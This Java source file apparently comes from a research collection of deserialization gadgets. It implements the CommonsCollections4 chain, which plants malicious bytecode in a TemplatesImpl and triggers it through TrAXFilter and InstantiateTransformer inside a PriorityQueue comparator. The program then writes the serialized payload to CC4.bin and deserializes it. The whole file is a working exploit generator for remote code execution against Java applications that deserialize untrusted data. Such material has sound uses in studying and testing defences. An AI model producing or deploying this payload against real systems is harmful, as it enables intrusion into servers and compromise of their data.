package org.su18.serialize.yoserial.CommonCollections.CommonCollections4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.su18.serialize.yoserial.Utils.SerializeUtil;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @author su18
 */
public class CC4 {

	public static String fileName = "CC4.bin";

	public static void main(String[] args) throws Exception {

		// 生成包含恶意类字节码的 TemplatesImpl 类
		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();

		// 结合 ChainedTransformer
		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
				new ConstantTransformer(TrAXFilter.class),
				new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
		});

		TransformingComparator comparator = new TransformingComparator(chain);

		// 在初始化时不带入 comparator
		PriorityQueue<String> queue = new PriorityQueue<>(2);
		queue.add("1");
		queue.add("2");

		Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
		field.setAccessible(true);
		field.set(queue, comparator);

		SerializeUtil.writeObjectToFile(queue, fileName);
		SerializeUtil.readFileObject(fileName);
	}
}
